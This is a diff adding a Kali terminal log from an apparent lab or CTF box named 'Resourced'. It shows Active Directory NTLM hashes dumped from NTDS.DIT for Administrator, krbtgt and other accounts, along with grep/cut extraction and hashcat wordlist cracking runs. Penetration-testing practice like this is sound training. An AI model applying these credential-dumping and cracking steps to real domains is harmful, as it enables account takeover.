@@ -1,0 +1,182 @@
+7147cd52a04ddae6754b0c
+L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
+J.Johnson:3e028552b946cc4f282b72879f63b726
+V.Ventz:913c144caea1c0a936fd1ccb46929d3c
+S.Swanson:bd7c11a9021d2708eda561984f3c8939
+P.Parker:980910b8fc2e4fe9d482123301dd19fe
+R.Robinson:fea5a148c14cf51590456b2102b29fac
+D.Durant:08aca8ed17a9eec9fac4acdcb4652c35
+G.Goldberg:62e16d17c3015c47b4d513e65ca757a2
+                                                                                                                    
+┌──(kali㉿kali)-[~/hacktrack/boxes/Resourced]
+└─$ grep ':::' dump.txt | grep -v '\$' | cut -d: -f1 > users.txt
+                                                                                                                    
+┌──(kali㉿kali)-[~/hacktrack/boxes/Resourced]
+└─$ ls
+ad_hostmap-hosts.txt  dump.txt  hashes  NTDS.DIT  passwords  screenshots  user_hash.txt  users.txt
+ad_hostmap.sh         exploits  loot    nt.txt    scans      SYSTEM       users          vajra
+                                                                                                                    
+┌──(kali㉿kali)-[~/hacktrack/boxes/Resourced]
+└─$ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-AMD Ryzen 7 PRO 6850H with Radeon Graphics, 4813/9627 MB (2048 MB allocatable), 16MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hash 'hashes.txt': Token length exception
+
+* Token length exception: 1/1 hashes
+  This error happens if the wrong hash type is specified, if the hashes are
+  malformed, or if input is otherwise not as expected (for example, if the
+  --username or --dynamic-x option is used but no username or dynamic-tag is present)
+
+No hashes loaded.
+
+Started: Fri Jul 24 16:06:18 2026
+Stopped: Fri Jul 24 16:06:18 2026
+                                                                                                                    
+┌──(kali㉿kali)-[~/hacktrack/boxes/Resourced]
+└─$ cat hashes       
+                                                                                                                    
+┌──(kali㉿kali)-[~/hacktrack/boxes/Resourced]
+└─$ cat hashes.txt                                                                               
+cat: hashes.txt: No such file or directory
+                                                                                                                    
+┌──(kali㉿kali)-[~/hacktrack/boxes/Resourced]
+└─$ hashcat -m 1000 user_hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-AMD Ryzen 7 PRO 6850H with Radeon Graphics, 4813/9627 MB (2048 MB allocatable), 16MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashfile 'user_hash.txt' on line 1 (Admini...12579b1666d4ac10f0f59f300776495f): Token length exception
+Hashfile 'user_hash.txt' on line 2 (Guest:31d6cfe0d16ae931b73c59d7e0c089c0): Token length exception
+Hashfile 'user_hash.txt' on line 3 (krbtgt:3004b16f88664fbebfcb9ed272b0565b): Token length exception
+Hashfile 'user_hash.txt' on line 4 (M.Mason:3105e0f6af52aba8e11d19f27e487e45): Token length exception
+Hashfile 'user_hash.txt' on line 5 (K.Keen:204410cc5a7147cd52a04ddae6754b0c): Token length exception
+Hashfile 'user_hash.txt' on line 6 (L.Livi...19a3a7550ce8c505c2d46b5e39d6f808): Token length exception
+Hashfile 'user_hash.txt' on line 7 (J.John...3e028552b946cc4f282b72879f63b726): Token length exception
+Hashfile 'user_hash.txt' on line 8 (V.Ventz:913c144caea1c0a936fd1ccb46929d3c): Token length exception
+Hashfile 'user_hash.txt' on line 9 (S.Swan...bd7c11a9021d2708eda561984f3c8939): Token length exception
+Hashfile 'user_hash.txt' on line 10 (P.Park...980910b8fc2e4fe9d482123301dd19fe): Token length exception
+Hashfile 'user_hash.txt' on line 11 (R.Robi...fea5a148c14cf51590456b2102b29fac): Token length exception
+Hashfile 'user_hash.txt' on line 12 (D.Dura...08aca8ed17a9eec9fac4acdcb4652c35): Token length exception
+Hashfile 'user_hash.txt' on line 13 (G.Gold...62e16d17c3015c47b4d513e65ca757a2): Token length exception
+
+* Token length exception: 13/13 hashes
+  This error happens if the wrong hash type is specified, if the hashes are
+  malformed, or if input is otherwise not as expected (for example, if the
+  --username or --dynamic-x option is used but no username or dynamic-tag is present)
+
+No hashes loaded.
+
+Started: Fri Jul 24 16:06:57 2026
+Stopped: Fri Jul 24 16:06:58 2026
+                                                                                                                    
+┌──(kali㉿kali)-[~/hacktrack/boxes/Resourced]
+└─$ cat user_hash.txt
+Administrator:12579b1666d4ac10f0f59f300776495f
+Guest:31d6cfe0d16ae931b73c59d7e0c089c0
+krbtgt:3004b16f88664fbebfcb9ed272b0565b
+M.Mason:3105e0f6af52aba8e11d19f27e487e45
+K.Keen:204410cc5a7147cd52a04ddae6754b0c
+L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
+J.Johnson:3e028552b946cc4f282b72879f63b726
+V.Ventz:913c144caea1c0a936fd1ccb46929d3c
+S.Swanson:bd7c11a9021d2708eda561984f3c8939
+P.Parker:980910b8fc2e4fe9d482123301dd19fe
+R.Robinson:fea5a148c14cf51590456b2102b29fac
+D.Durant:08aca8ed17a9eec9fac4acdcb4652c35
+G.Goldberg:62e16d17c3015c47b4d513e65ca757a2
+                                                                                                                    
+┌──(kali㉿kali)-[~/hacktrack/boxes/Resourced]
+└─$ hashcat -m 1000 nt.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-AMD Ryzen 7 PRO 6850H with Radeon Graphics, 4813/9627 MB (2048 MB allocatable), 16MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 14 digests; 14 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory allocated for this attack: 516 MB (5198 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+31d6cfe0d16ae931b73c59d7e0c089c0:                         
+Approaching final keyspace - workload adjusted.           
+
+                                                          
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: nt.txt
+Time.Started.....: Fri Jul 24 16:07:25 2026 (1 sec)
+Time.Estimated...: Fri Jul 24 16:07:26 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  8277.0 kH/s (0.26ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/14 (7.14%) Digests (total), 1/14 (7.14%) Digests (new)
+Progress.........: 14344385/14344385 (100.00%)
+Rejected.........: 0/14344385 (0.00%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: #!hottie -> $HEX[042a0337c2a156616d6f732103]
+
+Started: Fri Jul 24 16:07:24 2026
+Stopped: Fri Jul 24 16:07:28 2026
+                                                                                                                    
+┌──(kali㉿kali)-[~/hacktrack/boxes/Resourced]
+└─$ cat nt.txt       
+08aca8ed17a9eec9fac4acdcb4652c35
+12579b1666d4ac10f0f59f300776495f
+19a3a7550ce8c505c2d46b5e39d6f808
+204410cc5a7147cd52a04ddae6754b0c
+3004b16f88664fbebfcb9ed272b0565b
+3105e0f6af52aba8e11d19f27e487e45
+31d6cfe0d16ae931b73c59d7e0c089c0
+3e028552b946cc4f282b72879f63b726
+62e16d17c3015c47b4d513e65ca757a2
+913c144caea1c0a936fd1ccb46929d3c
+980910b8fc2e4fe9d482123301dd19fe
+9ddb6f4d9d01fedeb4bccfb09df1b39d
+bd7c11a9021d2708eda561984f3c8939
+fea5a148c14cf51590456b2102b29fac
+                                                                                                                    
+┌──(kali㉿kali)-[~/hacktrack/boxes/Resourced]
+└─$
